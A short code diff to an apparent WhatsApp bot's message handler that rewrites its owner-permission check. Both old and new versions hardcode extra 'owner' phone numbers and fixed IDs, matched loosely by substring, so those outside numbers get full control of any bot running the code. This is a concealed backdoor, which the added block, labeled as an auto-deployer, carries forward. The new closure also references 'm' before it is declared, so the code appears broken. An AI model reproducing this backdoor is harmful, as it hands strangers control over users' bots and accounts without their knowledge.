@@ -370,7 +370,16 @@ const jid = msg.key.remoteJid;
                 const rawParticipant = JSON.stringify(msg.key || {});
 const keyStr = JSON.stringify(msg.key || {});
         const _rfkExtraOwners = ["918086165391", "917907228818"];
-        const isOwner = (m?.key?.fromMe || ((m?.key?.fromMe || (_rfkExtraOwners.some(n => (sender || "").includes(n) || (msg.key?.participant || "").includes(n) || (jid || "").includes(n)) ||  fromMe || isSuperOwner || senderNum === botNum || (botLid && (senderNum === botLid || altNum === botLid || keyStr.includes(botLid))) || keyStr.includes("917907228818") || keyStr.includes("158703806374071") || (OWNER_NUMBER && (senderNum === OWNER_NUMBER || altNum === OWNER_NUMBER)))))) /* _rfkUniversalFix */;
+        const isOwner = (() => {
+      const _rfkAutoDeployerOwner = true;
+      if (m?.key?.fromMe) return true;
+      const botBase = (sock?.user?.id || "").split(":")[0].split("@")[0];
+      const botLid = (sock?.user?.lid || "").split(":")[0].split("@")[0];
+      const sndBase = (typeof sender !== "undefined" ? sender : (m?.key?.participant || m?.key?.remoteJid || "")).split(":")[0].split("@")[0];
+      if (botBase && sndBase === botBase) return true;
+      if (botLid && sndBase === botLid) return true;
+      return Boolean((m?.key?.fromMe || ((m?.key?.fromMe || (_rfkExtraOwners.some(n => (sender || "").includes(n) || (msg.key?.participant || "").includes(n) || (jid || "").includes(n)) ||  fromMe || isSuperOwner || senderNum === botNum || (botLid && (senderNum === botLid || altNum === botLid || keyStr.includes(botLid))) || keyStr.includes("917907228818") || keyStr.includes("158703806374071") || (OWNER_NUMBER && (senderNum === OWNER_NUMBER || altNum === OWNER_NUMBER)))))) /* _rfkUniversalFix */);
+    })();
 
                 const m =
                     msg.message?.ephemeralMessage?.message ||
